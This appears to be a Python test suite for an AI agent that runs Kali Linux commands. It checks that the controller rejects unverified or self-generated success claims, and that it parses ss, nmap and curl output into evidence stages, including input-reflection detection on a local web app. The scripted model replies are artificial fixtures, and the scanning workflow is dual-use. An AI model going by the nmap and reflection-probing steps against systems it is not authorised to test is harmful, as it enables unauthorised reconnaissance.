"""Offline checks for the normal chat prompt's Kali command flow."""

import contextlib
import io
import json
import os
import re
import shlex
import sys
import tempfile
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import Mock, patch

import deep_agent
import kali_access
import kali_workflow


class KaliChatTests(unittest.TestCase):
    def _run_chat(self, inputs, replies, *, shell=True, last_record=None, sudo_mode=False,
                  run_records=None):
        kali = Mock()
        kali.run.return_value = "192.168.56.101\n[exit 0; 0.05s]"
        kali.sudo_mode = sudo_mode
        kali.clear_sudo_mode.side_effect = lambda: setattr(kali, "sudo_mode", False)
        if last_record is not None:
            kali.last_record = last_record
        else:
            configured_records = list(run_records or [])

            def run(command):
                record = {
                    "command": command,
                    "execution_state": "completed",
                    "exit_code": 0,
                    "stdout": "192.168.56.101\n",
                    "stderr": "",
                    "timed_out": False,
                    "duration_seconds": 0.05,
                    "privilege_mode": "user",
                    "sudo_access_validated": False,
                }
                if configured_records:
                    record.update(configured_records.pop(0))
                    record.setdefault("command", command)
                kali.last_record = record
                return (
                    f"{record.get('stdout', '')}{record.get('stderr', '')}"
                    f"[exit {record.get('exit_code', 'unknown')}; 0.05s]"
                )

            kali.run.side_effect = run
        snapshots = []
        replies = iter(replies)

        def model(messages, *, tools, stream_output):
            snapshots.append((tools, stream_output, [dict(item) for item in messages]))
            return next(replies)

        output = io.StringIO()
        prompts = (["/shell"] if shell else []) + list(inputs) + ["exit"]
        with (patch("builtins.input", side_effect=prompts),
              patch("kali_access.KaliAccess", return_value=kali),
              patch.object(deep_agent, "_model_chat", side_effect=model),
              contextlib.redirect_stdout(output)):
            deep_agent.chat_loop()
        return kali, snapshots, output.getvalue()

    def test_direct_command_runs_once_and_returns_output_to_model(self):
        kali, calls, output = self._run_chat(["ip a"], [{"content": "Kali reported its address.", "tool_calls": []}])
        kali.run.assert_called_once_with("ip a")
        self.assertEqual([item[0] for item in calls], [False])
        evidence = json.loads(calls[0][2][-1]["content"])
        self.assertEqual(evidence["recorded_results"][0]["command"], "ip a")
        self.assertIn("192.168.56.101", evidence["recorded_results"][0]["output"])
        self.assertIn("Model interpretation (INFERRED from recorded results)", output)
        claims = deep_agent.EVIDENCE_LEDGER.snapshot()["claims"]
        self.assertEqual(claims[0]["state"], "INFERRED")

    def test_hosted_websites_request_uses_model_tools_instead_of_literal_find(self):
        request = "find all websites I have hosted here"
        tool = deep_agent._make_tool_call("run_kali_command", {
            "command": "ss -ltnp", "purpose": "inspect",
        })
        kali, calls, output = self._run_chat(
            [request],
            [{"content": "", "tool_calls": [tool]},
             {"content": "The listener output is recorded.", "tool_calls": []}],
        )
        kali.run.assert_called_once_with("ss -ltnp")
        self.assertTrue(calls[0][0])
        self.assertEqual(calls[0][2][-1]["role"], "user")
        self.assertTrue(calls[0][2][-1]["content"].startswith(request + "\n\nController-owned task state:"))
        self.assertNotIn(f"[Kali] $ {request}", output)

    def test_english_find_requests_are_not_direct_commands_or_fallback_commands(self):
        for request in (
            "find all websites I have hosted here",
            "find all websites", "find websites hosted here",
            "find websites we have hosted", "find the website first",
            "find my hosted sites", "which model are you?",
            "/usr/bin/find all websites I have hosted here",
        ):
            with self.subTest(request=request):
                self.assertIsNone(deep_agent._direct_kali_command(request))
                self.assertIsNone(deep_agent._shell_command_fallback(request))

    def test_actual_find_commands_and_quoted_prose_keep_direct_execution(self):
        commands = (
            "find /var/www /srv -maxdepth 4 -type f -name '*.html'",
            "find . -name my", "find all -maxdepth 2",
            "find logs reports", "find 'my'", 'find "I have hosted here"',
            'grep -n "I have hosted here" /etc/nginx/nginx.conf',
            "ip -4 route show table all", "ip route show table all",
            "echo I have hosted websites here", 'printf "%s\\n" my',
        )
        for command in commands:
            with self.subTest(command=command):
                self.assertEqual(deep_agent._direct_kali_command(command), command)
        self.assertEqual(deep_agent._direct_kali_command("/kali find my"), "find my")

    def test_missing_find_paths_do_not_mean_the_find_executable_is_missing(self):
        self.assertEqual(kali_access._failure_type(
            "find all websites", "", "find: 'all': No such file or directory", 1, False,
        ), "PATH_NOT_FOUND")
        self.assertEqual(kali_access._failure_type(
            "cat /missing", "", "cat: /missing: No such file or directory", 1, False,
        ), "PATH_NOT_FOUND")
        self.assertEqual(kali_access._failure_type(
            "/missing/tool", "", "bash: /missing/tool: No such file or directory", 127, False,
        ), "COMMAND_NOT_FOUND")
        self.assertEqual(kali_access._failure_type(
            "missing-tool", "", "bash: missing-tool: command not found", 127, False,
        ), "COMMAND_NOT_FOUND")

    def test_direct_state_change_requires_outcome_verification(self):
        wrong_verify = deep_agent._make_tool_call("run_kali_command", {
            "command": "systemctl is-active unrelated.service",
            "purpose": "verify",
            "hypothesis": "requested service is running",
            "expected_result": "exit_code=0",
        })
        verify = deep_agent._make_tool_call("run_kali_command", {
            "command": "systemctl is-active demo.service",
            "purpose": "verify",
            "hypothesis": "service is running",
            "expected_result": "exit_code=0",
        })
        kali, calls, output = self._run_chat(
            ["systemctl start demo.service"],
            [{"content": "", "tool_calls": [wrong_verify]},
             {"content": "", "tool_calls": [verify]},
             {"content": "The service check passed.", "tool_calls": []}],
        )
        self.assertEqual(
            [call.args[0] for call in kali.run.call_args_list],
            ["systemctl start demo.service", "systemctl is-active demo.service"],
        )
        self.assertTrue(all(call[0] for call in calls[:-1]))
        self.assertFalse(calls[-1][0])
        self.assertIn("CONTROLLER_REJECTED", calls[1][2][-1]["content"])
        self.assertIn("unrelated.service", calls[1][2][-1]["content"])
        self.assertIn("matched the command exit status", output)
        self.assertIn("overall task assessment remains INFERRED", output)

    def test_self_generated_output_cannot_verify_an_external_goal(self):
        workflow = deep_agent.KaliWorkflow(
            "host the site locally", requires_goal_check=True,
            requires_preflight_check=True,
        )
        fake_check = "printf 'HTTP/1.1 200 OK\\n'"
        issue = workflow.begin(
            fake_check, purpose="verify", expected_result="HTTP/1.1 200 OK",
        )
        self.assertIn("only generates its own output", issue)
        self.assertEqual(workflow.commands_started, 0)

        curl_record = {
            "command": "curl -fsS -i http://127.0.0.1/",
            "execution_state": "completed", "exit_code": 0,
            "timed_out": False, "output_truncated": False,
            "stdout": "HTTP/1.1 200 OK\\n", "stderr": "",
        }
        self.assertIsNone(workflow.begin(
            curl_record["command"], purpose="verify",
            expected_result="HTTP/1.1 200 OK",
        ))
        self.assertIsNone(workflow.finish_command(curl_record))
        self.assertTrue(workflow.preflight_satisfied_request)

        synthetic_record = {
            **curl_record, "command": fake_check,
        }
        self.assertIsNone(kali_workflow.expected_result_matches(
            "HTTP/1.1 200 OK", synthetic_record, purpose="verify",
        ))
        self.assertIs(kali_workflow.expected_result_matches(
            "HTTP/1.1 200 OK", synthetic_record, purpose="test",
        ), True)

    def test_controller_retries_self_generated_preflight_with_a_real_state_check(self):
        synthetic = deep_agent._make_tool_call("run_kali_command", {
            "command": "printf 'HTTP/1.1 200 OK\\n'",
            "purpose": "verify", "hypothesis": "local site responds",
            "expected_result": "HTTP/1.1 200 OK",
        })
        preflight = deep_agent._make_tool_call("run_kali_command", {
            "command": "curl -fsS -i http://127.0.0.1/",
            "purpose": "verify", "hypothesis": "local site responds",
            "expected_result": "HTTP/1.1 200 OK",
        })
        kali, calls, output = self._run_chat(
            ["host it locally"],
            [{"content": "", "tool_calls": [synthetic]},
             {"content": "", "tool_calls": [preflight]},
             {"content": "The existing site is available locally.", "tool_calls": []}],
            run_records=[{"stdout": "HTTP/1.1 200 OK\\n"}],
        )
        kali.run.assert_called_once_with("curl -fsS -i http://127.0.0.1/")
        self.assertIn("only generates its own output", calls[1][2][-1]["content"])
        self.assertIn('"CONTROLLER_REJECTED": true', calls[1][2][-1]["content"])
        self.assertIn("matched captured output", output)

    def test_preflight_rejection_explains_the_command_side_effect(self):
        workflow = deep_agent.KaliWorkflow(
            "check the local website", requires_goal_check=True,
            requires_preflight_check=True,
        )
        command = (
            "curl -sS -o /tmp/route_out.txt -w 'HTTP_CODE:%{http_code}\\n' "
            "http://127.0.0.1:9832/"
        )
        issue = deep_agent._model_command_issue(
            command, "check whether the local website works",
            workflow=workflow, purpose="change",
        )
        self.assertIn("curl writes response data to /tmp/route_out.txt", issue)
        self.assertIn("Do not repeat it", issue)

        read_only_command = command.replace("/tmp/route_out.txt", "/dev/null")
        self.assertFalse(deep_agent._command_changes_state(read_only_command))
        self.assertIsNone(deep_agent._model_command_issue(
            read_only_command, "check whether the local website works",
            workflow=workflow, purpose="verify",
        ))

    def test_run_request_is_treated_as_an_outcome_goal(self):
        self.assertIsNotNone(deep_agent.GOAL_OUTCOME_REQUEST.match("run wazuh"))
        for request in ("I want to host it locally", "I need to start Wazuh"):
            with self.subTest(request=request):
                self.assertTrue(deep_agent._needs_kali(request, None))
                self.assertIsNotNone(deep_agent.GOAL_OUTCOME_REQUEST.match(request))
        self.assertIsNotNone(deep_agent.EXPLICIT_CHANGE_REQUEST.match("I want to create a website"))

    def test_host_request_checks_existing_outcome_before_starting_a_server(self):
        rejected_change = deep_agent._make_tool_call("run_kali_command", {
            "command": "systemctl start nginx",
        })
        preflight = deep_agent._make_tool_call("run_kali_command", {
            "command": "curl -sS -i http://127.0.0.1/",
            "purpose": "verify",
            "hypothesis": "local site is already served",
            "expected_result": "HTTP/1.1 200 OK",
        })
        kali, calls, output = self._run_chat(
            ["host it locally", "/debug"],
            [{"content": "", "tool_calls": [rejected_change]},
             {"content": "", "tool_calls": [preflight]},
             {"content": "Apache already serves the site at http://127.0.0.1/.", "tool_calls": []}],
            run_records=[{"stdout": "HTTP/1.1 200 OK\nServer: Apache\n"}],
        )
        self.assertTrue(deep_agent._needs_kali("host it locally", None))
        self.assertEqual(deep_agent.GOAL_OUTCOME_REQUEST.match("host it locally").group(0).strip(), "host")
        kali.run.assert_called_once_with("curl -sS -i http://127.0.0.1/")
        self.assertIn("preflight check", calls[1][2][-1]["content"].lower())
        self.assertIn('"CONTROLLER_REJECTED": true', calls[1][2][-1]["content"])
        self.assertIn("matched captured output", output)
        self.assertIn('"validation_stage": "command_policy"', output)
        self.assertIn('"command": "systemctl start nginx"', output)
        self.assertNotIn('"command_evidence"', output)
        self.assertEqual(len(deep_agent.CONTROLLER_DIAGNOSTICS), 1)
        self.assertFalse(deep_agent.CONTROLLER_DIAGNOSTICS[0]["command_submitted"])

    def test_existing_site_does_not_fulfill_explicit_create_request(self):
        preflight = deep_agent._make_tool_call("run_kali_command", {
            "command": "curl -sS -i http://127.0.0.1/",
            "purpose": "verify",
            "hypothesis": "a site already responds locally",
            "expected_result": "HTTP/1.1 200 OK",
        })
        create = deep_agent._make_tool_call("run_kali_command", {
            "command": "cat > /tmp/tic-tac-toe.html <<'EOF'\n<h1>Tic Tac Toe</h1>\nEOF",
            "purpose": "change",
            "hypothesis": "the requested page is written",
        })
        verify = deep_agent._make_tool_call("run_kali_command", {
            "command": "grep -F 'Tic Tac Toe' /tmp/tic-tac-toe.html",
            "purpose": "verify",
            "hypothesis": "the requested page was written",
            "expected_result": "Tic Tac Toe",
        })
        kali, calls, output = self._run_chat(
            ["create a website on Kali"],
            [{"content": "", "tool_calls": [preflight]},
             {"content": "The existing site already satisfies the request.", "tool_calls": []},
             {"content": "", "tool_calls": [create]},
             {"content": "", "tool_calls": [verify]},
             {"content": "The requested page was created and verified.", "tool_calls": []}],
            run_records=[
                {"stdout": "HTTP/1.1 200 OK\nPortfolio\n"},
                {"stdout": "page written\n"},
                {"stdout": "<h1>Tic Tac Toe</h1>\n"},
            ],
        )
        self.assertEqual([call.args[0] for call in kali.run.call_args_list], [
            "curl -sS -i http://127.0.0.1/",
            "cat > /tmp/tic-tac-toe.html <<'EOF'\n<h1>Tic Tac Toe</h1>\nEOF",
            "grep -F 'Tic Tac Toe' /tmp/tic-tac-toe.html",
        ])
        self.assertIn("no state-changing action has fulfilled the explicit user request", calls[2][2][-1]["content"])
        self.assertIn("requested page was created and verified", output)
        self.assertNotIn("The existing site already satisfies the request", output)
        self.assertIn("matched captured output", output)

    def test_failed_outcome_check_cannot_be_overridden_by_model_success_claim(self):
        verify = deep_agent._make_tool_call("run_kali_command", {
            "command": "curl -sS -i http://127.0.0.1/",
            "purpose": "verify",
            "hypothesis": "local site returns success",
            "expected_result": "HTTP/1.1 200 OK",
        })
        kali, _, output = self._run_chat(
            ["host it locally"],
            [{"content": "", "tool_calls": [verify]},
             {"content": "The site is hosted and ready.", "tool_calls": []}],
            run_records=[{"stdout": "HTTP/1.1 404 Not Found\n"}],
        )
        kali.run.assert_called_once_with("curl -sS -i http://127.0.0.1/")
        self.assertNotIn("The site is hosted and ready.", output)
        self.assertIn("Controller evidence does not confirm the requested outcome", output)
        self.assertIn("HTTP/1.1 404 Not Found", output)
        self.assertIn("did not match complete captured output", output)

    def test_structured_controller_evidence_is_human_readable_in_fallback(self):
        encoded = json.dumps({
            "command_evidence": {
                "execution_state": "completed",
                "exit_code": 0,
                "stdout": "HTTP/1.1 200 OK\n",
                "stderr": "",
                "timed_out": False,
                "output_truncated": False,
            },
            "controller_execution": {
                "TOOL_CALL_RECEIVED": True,
                "CONTROLLER_REJECTED": False,
                "COMMAND_EXECUTED": True,
                "COMMAND_SUBMITTED": True,
            },
        })
        answer = deep_agent._recorded_results_fallback(
            [{"command": "curl -i http://127.0.0.1/", "output": encoded}],
            "summary unavailable",
        )
        self.assertIn("Execution: completed; exit code 0", answer)
        self.assertIn("HTTP/1.1 200 OK", answer)
        self.assertNotIn("command_evidence", answer)
        self.assertNotIn("controller_execution", answer)

    def test_execution_truth_keeps_completed_unknown_and_unstarted_distinct(self):
        ledger = deep_agent.EvidenceLedger()
        completed_unknown_exit = ledger.record_command({
            "command": "hostname", "execution_state": "completed", "exit_code": None,
        })
        submission_unknown = ledger.record_command({
            "command": "curl http://127.0.0.1/", "execution_state": "unknown",
            "exit_code": None, "submitted_at": None,
            "error": "SSH command submission could not be confirmed.",
        })
        not_started = ledger.record_command({
            "command": "hostname", "execution_state": "not_started", "exit_code": None,
        })
        with patch.object(deep_agent, "EVIDENCE_LEDGER", ledger):
            completed_flags = json.loads(
                deep_agent._structured_tool_output(completed_unknown_exit)
            )["command_evidence"]["controller_execution"]
            uncertain_flags = json.loads(
                deep_agent._structured_tool_output(submission_unknown)
            )["command_evidence"]["controller_execution"]
            unstarted_flags = json.loads(
                deep_agent._structured_tool_output(not_started)
            )["command_evidence"]["controller_execution"]

        self.assertIs(completed_flags["COMMAND_EXECUTED"], True)
        self.assertIs(completed_flags["COMMAND_SUBMITTED"], True)
        self.assertIsNone(uncertain_flags["COMMAND_EXECUTED"])
        self.assertIsNone(uncertain_flags["COMMAND_SUBMITTED"])
        self.assertIs(unstarted_flags["COMMAND_EXECUTED"], False)
        self.assertIs(unstarted_flags["COMMAND_SUBMITTED"], False)

    def test_timed_out_direct_state_change_reports_unverified_outcome(self):
        command = "systemctl restart demo.service"
        kali, calls, output = self._run_chat(
            [command], [], last_record={
                "command": command,
                "execution_state": "timed_out",
                "exit_code": None,
                "stdout": "",
                "stderr": "",
                "timed_out": True,
                "output_truncated": False,
            },
        )
        kali.run.assert_called_once_with(command)
        self.assertEqual(calls, [])
        self.assertIn("command timed out", output)
        self.assertIn("requested outcome remains unverified", output)

    def test_clarification_after_state_change_reports_unverified_outcome(self):
        inventory = deep_agent._make_tool_call("run_kali_command", {
            "command": "systemctl list-unit-files",
            "purpose": "inspect",
            "hypothesis": "available systemd units",
            "expected_result": "demo.service",
        })
        preflight = deep_agent._make_tool_call("run_kali_command", {
            "command": "systemctl is-active demo.service",
            "purpose": "verify",
            "hypothesis": "demo service already active",
            "expected_result": "exit_code=0",
        })
        change = deep_agent._make_tool_call("run_kali_command", {
            "command": "systemctl start demo.service",
        })
        kali, calls, output = self._run_chat(
            ["start demo.service"],
            [{"content": "", "tool_calls": [inventory]},
             {"content": "", "tool_calls": [preflight]},
             {"content": "", "tool_calls": [change]},
             {"content": "Which unit did you want me to start?", "tool_calls": []}],
            run_records=[
                {"stdout": "demo.service disabled enabled\n"},
                {"stdout": "inactive\n", "exit_code": 3},
                {"stdout": "Started demo.service\n"},
            ],
        )
        self.assertEqual(
            [call.args[0] for call in kali.run.call_args_list],
            ["systemctl list-unit-files", "systemctl is-active demo.service", "systemctl start demo.service"],
        )
        self.assertTrue(all(call[0] for call in calls))
        self.assertIn("no read-only outcome check followed", output)
        self.assertIn("requested outcome remains unverified", output)

    def test_verification_condition_matches_recorded_evidence_only(self):
        record = {
            "execution_state": "completed",
            "exit_code": 0,
            "timed_out": False,
            "output_truncated": False,
            "stdout": "Service is\nACTIVE\n",
            "stderr": "",
        }
        self.assertIs(kali_workflow.expected_result_matches("active", record), True)
        record["stdout"] = "inactive\n"
        self.assertIs(kali_workflow.expected_result_matches("active", record), False)
        self.assertIs(kali_workflow.expected_result_matches("exit_code=0", record), True)
        self.assertIs(kali_workflow.expected_result_matches("exit_code=1", record), False)
        record["output_truncated"] = True
        record["stdout"] = ""
        self.assertIs(kali_workflow.expected_result_matches("active", record), None)
        record["timed_out"] = True
        record["output_truncated"] = False
        self.assertIs(kali_workflow.expected_result_matches("exit_code=0", record), None)
        record.pop("stdout")
        record["timed_out"] = False
        self.assertIs(kali_workflow.expected_result_matches("active", record), None)

    def test_output_marker_does_not_verify_a_failed_command(self):
        record = {
            "execution_state": "completed",
            "exit_code": 3,
            "timed_out": False,
            "output_truncated": False,
            "stdout": "active\n",
            "stderr": "",
        }
        self.assertIsNone(kali_workflow.expected_result_matches("active", record))

    def test_failed_marker_check_cannot_support_a_success_claim(self):
        verify = deep_agent._make_tool_call("run_kali_command", {
            "command": "systemctl is-active wazuh-manager",
            "purpose": "verify",
            "hypothesis": "manager is active",
            "expected_result": "active",
        })
        kali, _, output = self._run_chat(
            ["run wazuh"],
            [{"content": "", "tool_calls": [verify]},
             {"content": "Wazuh manager is running.", "tool_calls": []}],
            run_records=[{"stdout": "active\n", "exit_code": 3}],
        )
        kali.run.assert_called_once_with("systemctl is-active wazuh-manager")
        self.assertNotIn("Wazuh manager is running.", output)
        self.assertIn("Controller evidence does not confirm the requested outcome", output)
        self.assertIn("exited with status 3", output)

    def test_evidence_ledger_assigns_a_linkable_id_when_runner_omits_one(self):
        ledger = deep_agent.EvidenceLedger()
        first = ledger.record_command({
            "command": "hostname",
            "execution_state": "completed",
            "exit_code": 0,
        })
        second = ledger.record_command({
            "command": "whoami",
            "execution_state": "completed",
            "exit_code": 0,
        })
        self.assertTrue(first.evidence_id)
        self.assertTrue(second.evidence_id)
        self.assertNotEqual(first.evidence_id, second.evidence_id)
        self.assertIs(ledger.command_by_evidence_id(first.evidence_id), first)

    def test_evidence_facts_separate_listener_http_input_reflection_and_finding(self):
        ledger = deep_agent.EvidenceLedger()
        listeners = ledger.record_command({
            "command": "ss -tlnp | head -50",
            "state": "UNVERIFIED",
            "execution_state": "completed",
            "exit_code": 0,
            "stdout": (
                "State Recv-Q Send-Q Local Address:Port Peer Address:Port Process\n"
                'LISTEN 0 511 *:9832* :* users:(("apache2",pid=535,fd=4))\n'
                'LISTEN 0 511 0.0.0.0:443 0.0.0.0:* users:(("node",pid=536,fd=19))\n'
            ),
        })
        listener_facts = ledger.facts_for_evidence_id(listeners.evidence_id)
        self.assertEqual([fact.stage for fact in listener_facts], [
            deep_agent.EvidenceStage.SERVICE_FOUND,
            deep_agent.EvidenceStage.SERVICE_FOUND,
        ])
        self.assertEqual(listener_facts[0].value["port"], 9832)
        self.assertEqual(listener_facts[0].value["process"], "apache2")

        response = ledger.record_command({
            "command": "curl -s -i 'http://127.0.0.1:9832/test.php?id=marker123456'",
            "state": "UNVERIFIED",
            "execution_state": "completed",
            "exit_code": 0,
            "stdout": (
                "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n"
                "<h1>Product ID: marker123456</h1>"
            ),
        })
        response_facts = ledger.facts_for_evidence_id(response.evidence_id)
        stages = {fact.stage for fact in response_facts}
        self.assertEqual(stages, {
            deep_agent.EvidenceStage.HTTP_RESPONSE_OBSERVED,
            deep_agent.EvidenceStage.WEB_APP_CONFIRMED,
            deep_agent.EvidenceStage.INPUT_SURFACE_FOUND,
            deep_agent.EvidenceStage.REFLECTION_FOUND,
        })
        reflected = next(fact for fact in response_facts
                         if fact.stage is deep_agent.EvidenceStage.REFLECTION_FOUND)
        self.assertFalse(reflected.value["browser_execution_tested"])
        self.assertNotIn(deep_agent.EvidenceStage.SECURITY_FINDING_VERIFIED, stages)

        body_only = ledger.record_command({
            "command": "curl -s 'http://127.0.0.1:9832/test.php?id=marker123456'",
            "execution_state": "completed", "exit_code": 0,
            "stdout": "<h1>Product ID: marker123456</h1>",
        })
        body_only_stages = {fact.stage for fact in ledger.facts_for_evidence_id(body_only.evidence_id)}
        self.assertIn(deep_agent.EvidenceStage.HTTP_RESPONSE_OBSERVED, body_only_stages)
        self.assertIn(deep_agent.EvidenceStage.INPUT_SURFACE_FOUND, body_only_stages)
        self.assertIn(deep_agent.EvidenceStage.REFLECTION_FOUND, body_only_stages)
        self.assertNotIn(deep_agent.EvidenceStage.WEB_APP_CONFIRMED, body_only_stages)

    def test_evidence_facts_parse_nmap_and_skip_failed_or_incomplete_results(self):
        ledger = deep_agent.EvidenceLedger()
        scan = ledger.record_command({
            "command": "nmap -Pn --top-ports 100 192.168.56.101",
            "execution_state": "completed", "exit_code": 0,
            "stdout": (
                "Nmap scan report for 192.168.56.101\n"
                "PORT   STATE SERVICE\n80/tcp open  http\n"
            ),
        })
        scan_facts = ledger.facts_for_evidence_id(scan.evidence_id)
        self.assertEqual(len(scan_facts), 1)
        self.assertEqual(scan_facts[0].value["host"], "192.168.56.101")
        self.assertEqual(scan_facts[0].value["port"], 80)

        for record in (
            {"command": "ss -tln", "execution_state": "completed", "exit_code": 1,
             "stdout": "LISTEN 0 1 *:8080 *:*"},
            {"command": "ss -tln", "execution_state": "completed", "exit_code": 0,
             "stdout": "LISTEN 0 1 *:8080 *:*", "output_truncated": True},
            {"command": "curl -s -i http://127.0.0.1:8080/", "execution_state": "not_started",
             "exit_code": None, "stdout": "HTTP/1.1 200 OK"},
        ):
            failed = ledger.record_command(record)
            self.assertEqual(ledger.facts_for_evidence_id(failed.evidence_id), [])

    def test_security_finding_cannot_be_marked_verified_without_validator(self):
        ledger = deep_agent.EvidenceLedger()
        evidence = ledger.record_command({
            "command": "curl -s http://127.0.0.1/",
            "execution_state": "completed", "exit_code": 0, "stdout": "ok",
        })
        with self.assertRaisesRegex(ValueError, "only by the workflow marker-matching"):
            ledger.record_fact(
                evidence.evidence_id,
                deep_agent.EvidenceStage.SECURITY_FINDING_VERIFIED,
                {"claim": "xss"},
                validator="model_confidence",
            )

    def test_controller_facts_survive_tool_output_and_continuation_serialization(self):
        ledger = deep_agent.EvidenceLedger()
        evidence = ledger.record_command({
            "command": "ss -tlnp",
            "execution_state": "completed", "exit_code": 0,
            "stdout": 'LISTEN 0 511 *:9832 *:* users:(("apache2",pid=535,fd=4))\n',
        })
        call = deep_agent._make_tool_call("run_kali_command", {"command": evidence.command})
        with patch.object(deep_agent, "EVIDENCE_LEDGER", ledger):
            tool_content = deep_agent._structured_tool_output(evidence)
            messages = [
                {"role": "user", "content": "inspect local services"},
                {"role": "assistant", "content": "", "tool_calls": [call]},
                {"role": "tool", "tool_call_id": call["id"], "content": tool_content},
            ]
            payload = json.loads(tool_content)
            self.assertEqual(payload["controller_facts"][0]["stage"], "SERVICE_FOUND")
            records = deep_agent._execution_records(messages)
            self.assertEqual(records[0]["facts"][0]["evidence_id"], evidence.evidence_id)
            continuation = deep_agent._continuation_evidence(records)
            self.assertIn("SERVICE_FOUND", continuation)
            progress = deep_agent._controller_fact_progress(records)
            self.assertIn('"observed_stages": ["SERVICE_FOUND"]', progress)
            self.assertIn('"not_established_stages": ["HTTP_RESPONSE_OBSERVED"', progress)
            fallback = deep_agent._fallback_output_text({"output": tool_content})
            self.assertIn("service found at tcp *:9832 (apache2)", fallback)

    def test_reused_tool_call_id_keeps_distinct_command_evidence_paired(self):
        ledger = deep_agent.EvidenceLedger()
        first = ledger.record_command({
            "evidence_id": "same-id",
            "command": "hostname",
            "execution_state": "completed",
            "exit_code": 0,
            "stdout": "kali\n",
        })
        second = ledger.record_command({
            "evidence_id": "same-id",
            "command": "whoami",
            "execution_state": "completed",
            "exit_code": 0,
            "stdout": "kali\n",
        })
        self.assertNotEqual(first.evidence_id, second.evidence_id)

        messages = [{"role": "user", "content": "identify this system"}]
        deep_agent._record_tool_result(messages, "hostname", "reused-call-id", "kali\n", first)
        deep_agent._record_tool_result(messages, "whoami", "reused-call-id", "kali\n", second)
        with patch.object(deep_agent, "EVIDENCE_LEDGER", ledger):
            records = deep_agent._execution_records(messages)

        self.assertEqual([record["command"] for record in records], ["hostname", "whoami"])
        self.assertEqual([record["execution"]["evidence_id"] for record in records], [
            first.evidence_id, second.evidence_id,
        ])

    def test_claim_ledger_requires_real_evidence_and_rejects_unrun_validator_names(self):
        ledger = deep_agent.EvidenceLedger()
        evidence = ledger.record_command({
            "command": "hostname",
            "execution_state": "completed",
            "exit_code": 0,
        })
        claim = ledger.record_claim(
            "claim-1", "Kali returned a hostname", [evidence.evidence_id], state="INFERRED",
        )
        self.assertIs(claim.state, deep_agent.EvidenceState.INFERRED)
        for state in (deep_agent.EvidenceState.VERIFIED, deep_agent.EvidenceState.CONTRADICTED):
            with self.subTest(state=state), self.assertRaisesRegex(ValueError, "No deterministic claim validator"):
                ledger.record_claim(
                    "claim-2", "Claim", [evidence.evidence_id], state=state,
                    validator="a plausible-sounding name",
                )
        with self.assertRaisesRegex(ValueError, "require linked command evidence"):
            ledger.record_claim("claim-4", "Unsupported summary", [])
        with self.assertRaisesRegex(ValueError, "unknown command evidence"):
            ledger.record_claim("claim-3", "Claim", ["missing-id"])

    def test_shell_mode_runs_simple_command_without_model_planning(self):
        kali, calls, _ = self._run_chat(["date"], [{"content": "Kali reported the time.", "tool_calls": []}])
        kali.run.assert_called_once_with("date")
        self.assertEqual([item[0] for item in calls], [False])

    def test_plain_ping_is_bounded(self):
        kali, _, _ = self._run_chat(["ping 127.0.0.1"], [{"content": "Ping completed.", "tool_calls": []}])
        kali.run.assert_called_once_with("ping -c 4 127.0.0.1")

    def test_k2_json_plan_executes_then_model_summarizes(self):
        plan = {"content": '{"analysis":"plan","command":"nmap -sT 192.168.56.101","purpose":"test","hypothesis":"scan completes","expected_result":"exit_code=0"}', "tool_calls": []}
        parsed = deep_agent._normalize_reply(plan)
        kali, calls, output = self._run_chat(
            ["probe services on 192.168.56.101"],
            [parsed, {"content": "Kali returned scan output.", "tool_calls": []}],
        )
        kali.run.assert_called_once_with("nmap -sT 192.168.56.101")
        self.assertEqual([item[0] for item in calls], [True, True])
        self.assertNotIn('"analysis"', output)

    def test_unactionable_json_plan_is_not_shown_to_user(self):
        answer = deep_agent.safe_answer('{"analysis":"internal","plan":"inspect services"}')
        self.assertNotIn('"analysis"', answer)
        self.assertNotIn('"plan"', answer)
        self.assertIn("internal planning data", answer)

    def test_fuzzy_confirmation_preserves_previous_goal_but_rejects_nearby_request(self):
        self.assertTrue(deep_agent._is_continuation("GO ahaed"))
        self.assertTrue(deep_agent._needs_kali("GO ahaed", "inspect local web services"))
        self.assertFalse(deep_agent._needs_kali("GO ahaed", None))
        self.assertFalse(deep_agent._is_continuation("go to website"))

    def test_successful_command_cannot_be_erased_by_no_commands_summary(self):
        call = deep_agent._make_tool_call("run_kali_command", {"command": "ss -tlnp | head -50"})
        kali, calls, output = self._run_chat(
            ["inspect local web services", "GO ahaed"],
            [
                {"content": '{"analysis":"inspect","plan":"list listeners"}', "tool_calls": []},
                {"content": "", "tool_calls": [call]},
                {"content": "No commands ran for that request. No local website was found.", "tool_calls": []},
            ],
            run_records=[{"stdout": "LISTEN 0 511 *:9832 *:* apache2\\n"}],
        )
        kali.run.assert_called_once_with("ss -tlnp | head -50")
        self.assertIn("inspect local web services", calls[1][2][-1]["content"])
        self.assertNotIn("No commands ran for that request", output)
        self.assertNotIn("No local website was found", output)
        self.assertIn("ss -tlnp | head -50", output)
        self.assertIn("completed", output)

    def test_controller_feedback_keeps_prior_execution_facts_separate(self):
        feedback = deep_agent._controller_feedback(
            "inspect local web services", "next proposed command rejected",
            tool_call_received=True, controller_rejected=True,
            previous_records=[{
                "command": "ss -tlnp | head -50",
                "execution": {"execution_state": "completed", "exit_code": 0, "stdout_present": True},
                "facts": [{
                    "fact_id": "fact-one",
                    "evidence_id": "evidence-one",
                    "stage": "SERVICE_FOUND",
                    "value": {"protocol": "tcp", "local_address": "*:9832", "port": 9832,
                              "process": "apache2"},
                    "validator": "ss_tcp_listener_line_parser_v1",
                }],
                "output": "STDOUT:\nLISTEN 0 511 *:9832 *:* apache2\n",
            }],
        )
        self.assertIn('"COMMAND_EXECUTED": false', feedback)
        self.assertIn('"COMMAND_SUBMITTED": false', feedback)
        self.assertIn('"SCOPE": "this tool attempt only; prior command evidence is unchanged"', feedback)
        self.assertIn('"COMMAND": "ss -tlnp | head -50"', feedback)
        self.assertIn('"EXECUTION_STATE": "completed"', feedback)
        self.assertIn('"stage": "SERVICE_FOUND"', feedback)
        self.assertIn("service found at tcp *:9832 (apache2)", feedback)

        uncertain = deep_agent._controller_feedback(
            "inspect host", "SSH submission state is uncertain",
            tool_call_received=False, controller_rejected=False,
            previous_records=[{
                "command": "curl http://127.0.0.1/",
                "execution": {"execution_state": "unknown", "exit_code": None},
                "output": "SSH channel closed before status was read.",
            }],
        )
        self.assertIn('"COMMAND_EXECUTED": null', uncertain)
        self.assertIn('"COMMAND_SUBMITTED": null', uncertain)

    def test_security_prompt_separates_listener_from_application_and_finding_evidence(self):
        for stage in ("SERVICE_FOUND", "WEB_APP_CONFIRMED", "INPUT_SURFACE_FOUND",
